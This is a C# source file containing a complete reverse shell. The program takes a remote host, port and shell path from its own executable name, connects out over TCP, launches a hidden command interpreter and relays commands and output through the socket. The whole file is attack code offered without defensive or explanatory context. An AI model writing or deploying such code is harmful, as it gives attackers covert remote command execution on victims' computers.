using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

namespace Connessione
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			//setting up vars
			string GetName= System.Diagnostics.Process.GetCurrentProcess().ProcessName;
			Console.WriteLine(GetName);
			string ConnectTo = "127.0.0.1";
			int PortTo = 443;
			string RealPathTo = "cmd";
			try
			{
				string[] Variablesfrfr = GetName.Split('_');
				ConnectTo = Variablesfrfr[1];
				PortTo = Int32.Parse(Variablesfrfr[2]);
				string ProcessTo = Variablesfrfr[3];
				RealPathTo = ProcessTo.Replace('-', '/');
			}
			catch (Exception e)
			{
				Console.WriteLine(e.Message);
			}

			using (TcpClient client = new TcpClient(ConnectTo, PortTo))
			{
				using (Stream stream = client.GetStream())
				{
					using (StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();

						p.StartInfo.FileName = RealPathTo;

						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while (true)
						{
							strInput.Append(rdr.ReadLine());
							strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}



		}


		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
	{
		StringBuilder strOutput = new StringBuilder();

		if (!String.IsNullOrEmpty(outLine.Data))
		{
			try
			{
				strOutput.Append(outLine.Data);
				streamWriter.WriteLine(strOutput);
				streamWriter.Flush();
			}
			catch (Exception err) { }
		}
	}

}

	
}